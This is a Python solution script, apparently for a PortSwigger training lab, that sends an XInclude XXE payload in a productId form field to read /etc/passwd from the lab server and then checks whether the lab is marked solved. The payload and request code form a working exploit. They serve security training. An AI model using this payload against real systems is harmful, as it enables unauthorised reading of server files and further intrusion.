import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/xxe/lab-xinclude-attack
# author: 0xyf


class XXE7:
    def __init__(self):
        self.lab_id = "0a9a00cd048945bc807cad9500440073"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.vuln_url = f"{self.url}/product/stock"

    def xxe(self):
        payload = """<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>"""
        data = {"productId": payload, "storeId": 1}
        print(f"[+] payload2: {data}")
        r = requests.post(
            f"{self.vuln_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.xxe()
        self.check_solved()


def main():
    XXE7().solve()


if __name__ == "__main__":
    main()
